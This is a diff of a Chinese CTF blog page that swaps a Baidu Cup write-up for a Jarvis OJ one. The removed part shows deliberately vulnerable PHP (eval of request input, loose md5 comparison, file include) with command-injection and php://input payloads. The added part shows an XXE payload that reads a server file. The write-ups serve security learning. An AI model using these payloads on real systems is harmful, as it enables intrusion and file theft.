@@ -15,19 +15,18 @@
 
 
 
-<meta name="description" content="这次前三个题目代码都很短，然而还是要好好研究，自己并不怎么会">
+<meta name="description" content="查看源码后获得一串JS代码">
 <meta property="og:type" content="article">
-<meta property="og:title" content="百度杯二月第二场">
-<meta property="og:url" content="http://isron.dropsec.xyz/2017/02/22/百度杯二月第二场/index.html">
+<meta property="og:title" content="Jarvis OJ api调用">
+<meta property="og:url" content="http://isron.dropsec.xyz/2017/03/13/Jarvis-OJ-api调用/index.html">
 <meta property="og:site_name" content="Isron">
-<meta property="og:description" content="这次前三个题目代码都很短，然而还是要好好研究，自己并不怎么会">
-<meta property="og:image" content="http://i1.piimg.com/567571/ad6ff750d73df4bc.png">
-<meta property="og:image" content="http://p1.bqimg.com/567571/344b6ecdf4830adc.png">
-<meta property="og:updated_time" content="2017-02-24T07:36:20.491Z">
+<meta property="og:description" content="查看源码后获得一串JS代码">
+<meta property="og:image" content="http://i1.piimg.com/567571/0a496a1df9ab24d7.png">
+<meta property="og:updated_time" content="2017-03-13T05:41:16.257Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="百度杯二月第二场">
-<meta name="twitter:description" content="这次前三个题目代码都很短，然而还是要好好研究，自己并不怎么会">
-<meta name="twitter:image" content="http://i1.piimg.com/567571/ad6ff750d73df4bc.png">
+<meta name="twitter:title" content="Jarvis OJ api调用">
+<meta name="twitter:description" content="查看源码后获得一串JS代码">
+<meta name="twitter:image" content="http://i1.piimg.com/567571/0a496a1df9ab24d7.png">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -59,7 +58,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>百度杯二月第二场 | Isron</title>
+<title>Jarvis OJ api调用 | Isron</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -278,11 +277,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-百度杯二月第二场" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-Jarvis-OJ-api调用" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2017/02/22/百度杯二月第二场/" class="article-date">
-      <time datetime="2017-02-22T03:07:04.000Z" itemprop="datePublished">2017-02-22</time>
+      <a href="/2017/03/13/Jarvis-OJ-api调用/" class="article-date">
+      <time datetime="2017-03-13T02:49:06.000Z" itemprop="datePublished">2017-03-13</time>
 </a>
 
 
@@ -297,7 +296,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      百度杯二月第二场
+      Jarvis OJ api调用
     </h1>
   
 
@@ -308,7 +307,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XXE/">XXE</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -318,54 +317,9 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>这次前三个题目代码都很短，然而还是要好好研究，自己并不怎么会<br><a id="more"></a></p>
-<h2 id="MISC-1"><a href="#MISC-1" class="headerlink" title="MISC-1"></a>MISC-1</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>; <span class="comment">//包含flag.php</span></div><div class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</div><div class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^\w*$/'</span>,$a ))&#123;</div><div class="line">  <span class="keyword">die</span>(<span class="string">'ERROR'</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">eval</span>(<span class="string">"var_dump($$a);"</span>);</div><div class="line">show_source(<span class="keyword">__FILE__</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
-<p>$_REQUEST与$_POST,$_GET都用于PHP接受表单。</p>
-<ul>
-<li>$_REQUEST具有$_POST $_GET的功能,但是$_REQUEST比较慢。通过post和get方法提交的所有数据都可以通过$_REQUEST数组获得</li>
-<li>$_GET安全性较低，传送数据量较小，get传输的数据在URL当中能够看到</li>
-<li>$_POST安全性较高，传送数据量较大，一般默认为不受限制，用户看不到数据的传送</li>
-</ul>
-<p>preg_match() 函数用于进行正则表达式匹配</p>
-<pre><code>语法：preg_match (pattern , subject, matches)
-</code></pre><table>
-<thead>
-<tr>
-<th>参数</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>pattern</td>
-<td>正则表达式</td>
-</tr>
-<tr>
-<td>subject</td>
-<td>需要匹配的检索对象</td>
-</tr>
-<tr>
-<td>matches</td>
-<td>可选，存储匹配结果的数组</td>
-</tr>
-</tbody>
-</table>
-<pre><code>\w：匹配字母或数字或下划线或汉字
-if(!preg_match(&apos;/^\w*$/&apos;,$a )){ //当匹配不到上述信息时执行ERROR
-</code></pre><p>题目说flag在某六位变量中,所以使用超全局变量$GLOBALS将所有的全局变量输出出来。</p>
-<pre><code>$GLOBALS 这种全局变量用于在 PHP 脚本中的任意位置访问全局变量
-</code></pre><h2 id="MISC-2"><a href="#MISC-2" class="headerlink" title="MISC-2"></a>MISC-2</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</div><div class="line">$a = @$_REQUEST[<span class="string">'hello'</span>];</div><div class="line"><span class="keyword">eval</span>( <span class="string">"var_dump($a);"</span>);</div><div class="line">show_source(<span class="keyword">__FILE__</span>);</div></pre></td></tr></table></figure>
-<p>提示flag不在变量中，那么可以根据eval的特性</p>
-<pre><code>语法：eval(phpcode)
-</code></pre><p>进行代码执行</p>
-<pre><code>?hello=);echo `cat flag.php`;//
-eval(&quot;var_dump();echo `cat flag.php`;//);&quot;);
-</code></pre><p>闭合前面的括号执行后面的cat flag.php得到flag</p>
-<h2 id="MISC-3"><a href="#MISC-3" class="headerlink" title="MISC-3"></a>MISC-3</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line"> <span class="php"><span class="meta">&lt;?php</span> </span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">session_start();</div><div class="line"><span class="keyword">require</span>(<span class="string">'./flag.php'</span>);</div><div class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'nums'</span>]))&#123;</div><div class="line">  $_SESSION[<span class="string">'nums'</span>] = <span class="number">0</span>;</div><div class="line">  $_SESSION[<span class="string">'time'</span>] = time();</div><div class="line">  $_SESSION[<span class="string">'whoami'</span>] = <span class="string">'ea'</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'time'</span>]+<span class="number">120</span>&lt;time())&#123;</div><div class="line">  session_destroy();</div><div class="line">&#125;</div><div class="line"></div><div class="line">$value = $_REQUEST[<span class="string">'value'</span>];</div><div class="line">$str_rand = range(<span class="string">'a'</span>, <span class="string">'z'</span>);</div><div class="line">$str_rands = $str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)].$str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)];</div><div class="line"></div><div class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'whoami'</span>]==($value[<span class="number">0</span>].$value[<span class="number">1</span>]) &amp;&amp; substr(md5($value),<span class="number">5</span>,<span class="number">4</span>)==<span class="number">0</span>)&#123;</div><div class="line">  $_SESSION[<span class="string">'nums'</span>]++;</div><div class="line">  $_SESSION[<span class="string">'whoami'</span>] = $str_rands;</div><div class="line">  <span class="keyword">echo</span> $str_rands;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'nums'</span>]&gt;=<span class="number">10</span>)&#123;</div><div class="line">  <span class="keyword">echo</span> $flag;</div><div class="line">&#125;</div><div class="line"></div><div class="line">show_source(<span class="keyword">__FILE__</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
-<p>根据源码可知当<code>SESSION[&#39;nums&#39;]&gt;=10</code>大于等于10时输出源码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">'whoami'</span>]==(<span class="variable">$value</span>[0].<span class="variable">$value</span>[1]) &amp;&amp; substr(md5(<span class="variable">$value</span>),5,4)==0)&#123;</div><div class="line">  <span class="variable">$_SESSION</span>[<span class="string">'nums'</span>]++;</div><div class="line">  <span class="variable">$_SESSION</span>[<span class="string">'whoami'</span>] = <span class="variable">$str_rands</span>;</div><div class="line">  <span class="built_in">echo</span> <span class="variable">$str_rands</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>substr(md5($value),5,4)==0)恒成立，在对字符串进行类型转换时会被转换成0。为了防止这种情况发生最好采用<code>===</code><br>构造payload<code>?value[0]=e&amp;value[1]=a</code>使nums++且输出下一个whoami的值.累加得到flag</p>
-<h2 id="include"><a href="#include" class="headerlink" title="include"></a>include</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span> </span></div><div class="line">show_source(<span class="keyword">__FILE__</span>);</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'path'</span>]))&#123;</div><div class="line">    <span class="keyword">include</span>($_REQUEST[<span class="string">'path'</span>]);</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">include</span>(<span class="string">'phpinfo.php'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>很明显的文件包含漏洞，在查看PHPinfo时发现<br><img src="http://i1.piimg.com/567571/ad6ff750d73df4bc.png" alt=""><br>那么就可以利用php://input进行代码执行<br><img src="http://p1.bqimg.com/567571/344b6ecdf4830adc.png" alt=""><br>然后<code>cat dle345aae.php</code>得到flag</p>
+        <p>查看源码后获得一串JS代码<a id="more"></a><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">send</span>(<span class="params"></span>)</span>&#123;</div><div class="line"> evil_input = <span class="built_in">document</span>.getElementById(<span class="string">"evil-input"</span>).value;</div><div class="line"> <span class="keyword">var</span> xhr = XHR();</div><div class="line">     xhr.open(<span class="string">"post"</span>,<span class="string">"/api/v1.0/try"</span>,<span class="literal">true</span>);</div><div class="line">     xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">         <span class="keyword">if</span> (xhr.readyState==<span class="number">4</span> &amp;&amp; xhr.status==<span class="number">201</span>) &#123;</div><div class="line">             data = <span class="built_in">JSON</span>.parse(xhr.responseText);</div><div class="line">             tip_area = <span class="built_in">document</span>.getElementById(<span class="string">"tip-area"</span>);</div><div class="line">             tip_area.value = data.task.search+data.task.value;</div><div class="line">         &#125;</div><div class="line">     &#125;;</div><div class="line">     xhr.setRequestHeader(<span class="string">"Content-Type"</span>,<span class="string">"application/json"</span>);</div><div class="line">     xhr.send(<span class="string">'&#123;"search":"'</span>+evil_input+<span class="string">'","value":"own"&#125;'</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>由于JS学的贼辣鸡，读半天没读懂，看了下Response包发现<br><img src="http://i1.piimg.com/567571/0a496a1df9ab24d7.png" alt=""><br>服务器是用python搭建的还有就是Content-Type很重要<a href="https://www.leavesongs.com/PENETRATION/slim3-xxe.html" target="_blank" rel="external">php框架slim架构上存在XXE漏洞</a>P牛之前的一篇文章主要就利用修改content—type内容进行XXE漏洞，将<code>Content-Type: application/json</code>修改为<code>Content-Type: application/xml</code>利用别人的payload读取/home/ctf/flag.txt文件的内容得到flag<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE try[&lt;!ENTITY xxe SYSTEM "file:///home/ctf/flag.txt"&gt;]&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">search</span>&gt;</span>type sth!<span class="tag">&lt;/<span class="name">search</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">value</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>第一次接触js代码跟XXE漏洞，之后好好研究研究</p>
 
       
     </div>
@@ -374,13 +328,13 @@ eval(&quot;var_dump();echo `cat flag.php`;//);&quot;);
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2017/02/22/百度杯二月第二场/">百度杯二月第二场</a></p>
+        <p><span>本文标题:</span><a href="/2017/03/13/Jarvis-OJ-api调用/">Jarvis OJ api调用</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Isron</a></p>
-        <p><span>发布时间:</span>2017-02-22, 11:07:04</p>
-        <p><span>最后更新:</span>2017-02-24, 15:36:20</p>
+        <p><span>发布时间:</span>2017-03-13, 10:49:06</p>
+        <p><span>最后更新:</span>2017-03-13, 13:41:16</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/02/22/百度杯二月第二场/" title="百度杯二月第二场">http://isron.dropsec.xyz/2017/02/22/百度杯二月第二场/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://isron.dropsec.xyz/2017/02/22/百度杯二月第二场/　　作者: Isron" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2017/03/13/Jarvis-OJ-api调用/" title="Jarvis OJ api调用">http://isron.dropsec.xyz/2017/03/13/Jarvis-OJ-api调用/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://isron.dropsec.xyz/2017/03/13/Jarvis-OJ-api调用/　　作者: Isron" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -392,16 +346,10 @@ eval(&quot;var_dump();echo `cat flag.php`;//);&quot;);
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2017/03/01/Jarvis-OJ-神盾局的秘密/">
-                    Jarvis OJ 神盾局的秘密
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2016/12/01/ubuntu下LAMP的环境配置/">
-                    ubuntu下LAMP的环境配置
+                <a href="/2017/03/05/简单的Python爬虫/">
+                    简单的Python爬虫
                 </a>
             </div>
         
@@ -413,7 +361,7 @@ eval(&quot;var_dump();echo `cat flag.php`;//);&quot;);
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC-1"><span class="toc-number">1.</span> <span class="toc-text">MISC-1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC-2"><span class="toc-number">2.</span> <span class="toc-text">MISC-2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC-3"><span class="toc-number">3.</span> <span class="toc-text">MISC-3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#include"><span class="toc-number">4.</span> <span class="toc-text">include</span></a></li></ol>
+            
         
     </div>
     <style>
@@ -453,7 +401,7 @@ eval(&quot;var_dump();echo `cat flag.php`;//);&quot;);
     
       <div class="duoshuo" id="comments">
     <div id="comment-box" ></div>
-    <div class="ds-thread" id="ds-thread" data-thread-key="2017/02/22/百度杯二月第二场/" data-title="百度杯二月第二场" data-url="http://isron.dropsec.xyz/2017/02/22/百度杯二月第二场/"></div>
+    <div class="ds-thread" id="ds-thread" data-thread-key="2017/03/13/Jarvis-OJ-api调用/" data-title="Jarvis OJ api调用" data-url="http://isron.dropsec.xyz/2017/03/13/Jarvis-OJ-api调用/"></div>
     <script>
         var duoshuoQuery = {short_name:"clearloveqaq"};
         var loadComment = function(){
@@ -476,15 +424,13 @@ eval(&quot;var_dump();echo `cat flag.php`;//);&quot;);
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2017/03/01/Jarvis-OJ-神盾局的秘密/" title="上一篇: Jarvis OJ 神盾局的秘密">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2016/12/01/ubuntu下LAMP的环境配置/" title="下一篇: ubuntu下LAMP的环境配置">
+            <a href="/2017/03/05/简单的Python爬虫/" title="下一篇: 简单的Python爬虫">
                 <i class="fa fa-angle-right"></i>
             </a>
         
